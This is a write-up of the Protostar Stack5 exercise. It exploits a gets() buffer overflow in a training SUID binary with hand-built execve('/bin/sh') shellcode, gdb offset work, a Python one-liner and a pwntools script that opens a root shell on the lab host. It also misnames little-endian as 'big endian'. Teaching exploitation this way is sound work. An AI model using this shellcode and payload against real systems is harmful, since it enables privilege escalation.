# Stack Five

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

**Hints**

- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
- remove the int3s once your shellcode is done.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Writeup

In this code we have only the buffer of 64 elements.

No function needed to call.

We can use a **shellcode** to get a shell as a **root**, because the binary have SUID:

```bash
$ ls -lah /opt/protostar/bin/stack5
-rwsr-xr-x 1 root root 23K Nov 24  2011 /opt/protostar/bin/stack5
```

To create a **shellcode** we need to write some **assembly code** that call **execve("/bin/sh")** and after that call an **exit(0)**.

The function **execve()** need three parameters:
- **path** of the program to execute
- a pointer to the array **argv[]**
- a pointer to the array **envp[]**

In assembly need to write in the regiters:
- **eax**: system call identifier (in this case is **11**)
- **ebx**: first argument (in this case the **path**)
- **ecx**: second argument (in this case the pointer to **argv[]**)
- **edx**: third argument (in this case the pointer to **envp[]**)

In **eax** the function will write the return value.

**N.B.**: a **NULL** pointer for **argv** and **envp** means that will use the array of the father

The assembly code will be:

```s
xor %eax, %eax          ; set EAX to zero  
push %eax               ; push it into the stack, is the zero terminated of the string
push $0x68732f2f        ; push into the stack the string //sh
push $0x6e69622f        ; push into the stack the string /bin
mov %esp, %ebx          ; set the first argument to the current position of the stack (to the string /bin//sh\0)
mov %eax, %ecx          ; set the second argument to NULL
mov %eax, %edx          ; set the third argument to NULL
mov $0xb, %al           ; set eax with the system call identifier of the execve() function (to 11) (use %al to not introduce zeros and to make the shellcode smaller)
int $0x80               ; call the system call with int 128
xor %eax, %eax          ; set EAX to zero
inc %eax                ; set EAX to one (more efficent than mov 1, %al) (need to be 1 for the system call exit())
int $0x80               ; call the system call with int 128
```

Save this code (without comments) into **shellcode.s** and after that we can compile it:

```bash
gcc -Wall -m 32 -c shellcode.s
```

Now we have **shellcode.o**, we can use **objdump** to get **opcodes**:

```bash
objdump -d shellcode.o
```

The output will be:

```
shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	89 c1                	mov    %eax,%ecx
  11:	89 c2                	mov    %eax,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
  17:	31 c0                	xor    %eax,%eax
  19:	40                   	inc    %eax
  1a:	cd 80                	int    $0x80
```

And the opcode are:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Now we have the **shellcode**.

Need to understand how to inject it.

We need to find how much of **words** there are between the **buffer** and the **EIP**. We can find it with **gdb**:

```bash
gdb /opt/protostar/bin/stack5
```

Insert this commands to remove **LINES** and **COLUMNS** environment variables from the debugger to make the **envp[]** array equal to a normal **/bin/sh** env:

```
unset env LINES
unset env COLUMNS
```

Use the **start** command:

```
start
```

To make first instruction of the binary including calling the first instruction of **main**.

Now the **return address** is written in the stack and we can find it using the register **EBP** and add a single word. (ebp + 1):

```
p $ebp+4
```

With this output:

```
(gdb) p $ebp+4
$1 = (void *) 0xbffffcdc
```

To find the address of the **buffer** we can set a breakpoint in te instruction before calling the **gets**.

To find the address of the code which make the breakpoint we can disassembly the main function, as this:

```
disass main
```

With this output:

```
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
```

Now set the breakpoint:

```
b *0x080483d4
```

And send the **continue** command (alias **c**):

```
c
```

The address of buffer is now stored in **EAX** register, we can find it with the command:

```
info registers
```

With this output:

```
(gdb) info registers
eax            0xbffffc90	-1073742704
ecx            0xa426d6b5	-1540958539
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc80	0xbffffc80
ebp            0xbffffcd8	0xbffffcd8
esi            0x0	0
edi            0x0	0
eip            0x80483d4	0x80483d4 <main+16>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

We are now able to discover the number of word between the **buffer** and the **EIP**:

```
0xbffffcdc - 0xbffffc90 = 4C = 76
```

The buffer size is 64, we can subtract 64:

```
76 - 64 = 12 / 4 = 3 word
```

Need to write 3 word of junk.

Our shellcode is 28 char length, need to add 36 junk chars, the 3 work of junk and finally the address of the buffer (that is **0xbffffc90**).

Write the addres in **big endian**:

```
\x90\xfc\xff\xbf
```

The exploit will be:

```bash
python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 36 + 'bbbb' * 3 + '\x90\xfc\xff\xbf')" | /opt/protostar/bin/stack5
```

The exploit work but the **stdin** is saturated and the shell will be closed.

Need to mantain open the stdin, we can use the command **cat** as a command filter:

```bash
(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 36 + 'bbbb' * 3 + '\x90\xfc\xff\xbf')"; cat) | /opt/protostar/bin/stack5
```

Now we are effective root:

```bash
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## Exploit

```python
#!/usr/bin/python3
from pwn import *

# Set context
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stack5')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack5'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x080483d4
continue
'''.format(**locals())

io = start(env={})
shellcode = asm(shellcraft.sh())
payload = shellcode + cyclic(64 - len(shellcode)) + b'junk' * 3 + p32(0xbffffc90)
io.sendline(payload)
io.interactive()
```